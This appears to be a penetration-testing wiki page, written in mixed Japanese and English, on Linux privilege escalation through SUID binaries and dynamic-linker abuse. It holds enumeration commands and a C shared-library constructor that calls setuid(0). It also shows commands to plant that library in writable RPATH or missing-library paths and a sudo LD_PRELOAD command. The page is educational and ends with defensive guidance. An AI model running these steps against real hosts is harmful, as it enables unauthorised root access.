# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binaries は通常、直接的な command execution の有無を確認しますが、custom SUID programs は dynamic linker 経由でも脆弱になる可能性があります。共通するテーマは単純です。privileged executable が、lower-privileged user に影響を与えられる path または configuration から code を読み込むというものです。

このページでは、missing libraries、writable library directories、`RPATH`/`RUNPATH`、sudo 経由の `LD_PRELOAD`、linker configuration、SUID hardlink confusion など、generic technique patterns に焦点を当てます。

## Fast Enumeration

まず、通常とは異なる SUID files を見つけ、それらが dynamically linked かどうかを確認します。
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
標準外の場所、カスタムアプリケーションパス、パッケージ管理対象ディレクトリ外にある root 所有のバイナリ、書き込み可能なディレクトリから読み込まれる依存関係に注目します。

有用な書き込み権限チェック:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

一部のカスタム SUID binaries は、存在しない shared object の読み込みを試みます。見つからないパスが attacker によって制御されているディレクトリ配下にある場合、その binary は attacker が用意した code を effective user として読み込む可能性があります。

失敗した library lookup を探します:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
バイナリが書き込み可能なパスから `libexample.so` を検索する場合、最小限の影響実証用ライブラリでは constructor を使用できます。検証中は影響実証を無害なものに保ちます。
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
binary がロードしようとする正確なファイル名でビルドします：
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
悪用可能な条件は、library が欠落していることだけではありません。攻撃者は、特権 loader が受け入れるパスに、互換性のある shared object を配置できなければなりません。

## Writable Library Directory

すべての依存関係が存在していても、それらの解決に使用されるディレクトリのいずれかが writable になっている場合があります。これにより、読み込まれる library を置き換えたり、同じ名前の、より優先度の高い library を配置したりできる可能性があります。

dependency のパスを確認します：
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
ディレクトリが書き込み可能な場合は、lab で copy-safe な方法を使って検証してください。live host 上で system libraries を置き換えると、authentication、package management、または boot-critical services が壊れる可能性があります。

## RPATH and RUNPATH

`RPATH` と `RUNPATH` は、loader が libraries を検索する場所を指定する dynamic-section entries です。attacker-writable directories を指している場合、SUID programs では危険です。

検出方法:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
リスクのある出力例:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
`/opt/app/lib` が書き込み可能で、バイナリが `libcustom.so` を必要とする場合、攻撃者はそこに悪意のある `libcustom.so` を配置できる可能性があります。
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` と `RUNPATH` は、すべての解決処理の詳細において同一ではありませんが、privilege-escalation の review では実際の問いは同じです。SUID binary が、attacker-writable directory 内で library name を検索するかどうかです。

## LD_PRELOAD、LD_LIBRARY_PATH と SUID

通常の program では、`LD_PRELOAD` と `LD_LIBRARY_PATH` によって shared object の loading を強制または制御できます。SUID program では、dynamic loader は通常 secure-execution mode に入り、危険な environment variable を無視します。

つまり、user が `LD_PRELOAD` を設定できるというだけでは、通常の SUID binary は脆弱ではありません。
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
一般的な例外は sudo の設定ミスです。`sudo -l` で `LD_PRELOAD` や `LD_LIBRARY_PATH` などの変数が保持されることが示される場合、sudo で許可されたコマンドが攻撃者の制御するコードを読み込む可能性があります：
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
これらのケースを混同しないでください。

- 通常の SUID binary に対する `LD_PRELOAD`：通常は secure execution によってブロックされます。
- sudo によって保持される `LD_PRELOAD`：exploit 可能性があります。
- writable path に `.so` がない場合：SUID binary がその path を自然に load するとき、exploit 可能です。
- writable directory を指す `RPATH`/`RUNPATH`：必要な library を control できる場合、exploit 可能です。
- `/etc/ld.so.preload` または linker config への write access：system-wide に影響し、impact が大きくなります。

## Linker Configuration

dynamic linker は、`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、linker cache、そして場合によっては `/etc/ld.so.preload` などの system configuration も読み込みます。

High-value checks：
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration は、単一の脆弱な SUID binary よりも通常は深刻です。これは、多数の dynamically linked process に影響を与える可能性があるためです。特に `/etc/ld.so.preload` は、privileged process に shared object を強制的に読み込ませられるため危険です。

## SUID Hardlink Confusion

Hardlink によって、同じ SUID inode を複数の名前で表示できます。これは、privileged helper を隠したり、cleanup を混乱させたり、単純な path ベースの review を回避したりするのに役立ちます。

複数の link がある SUID file を探します。
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
同じ inode へのすべてのパスを調査する：
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
悪用の本質は、hardlink によって権限が変更されることではありません。問題は path confusion です。つまり、privileged inode が、defender や script が想定していない name から到達可能になることです。inode と hardlink の workflow について詳しくは、[Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md) を参照してください。

## 防御に関する注意点

- SUID binary は最小限に保ち、監査を実施し、可能な限り package 管理下に置く。
- writable または application-managed directory を指す `RPATH`/`RUNPATH` entry は避ける。
- library directory は root 所有にし、通常 user による書き込みを禁止する。
- sudo 経由で `LD_PRELOAD`、`LD_LIBRARY_PATH`、その他同様の loader variable を保持しない。
- `/etc/ld.so.preload`、`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、および想定外の SUID file を監視する。
- hardlink された SUID file を確認し、標準的な system path 外にある custom SUID wrapper を調査する。

{{#include ../../banners/hacktricks-training.md}}
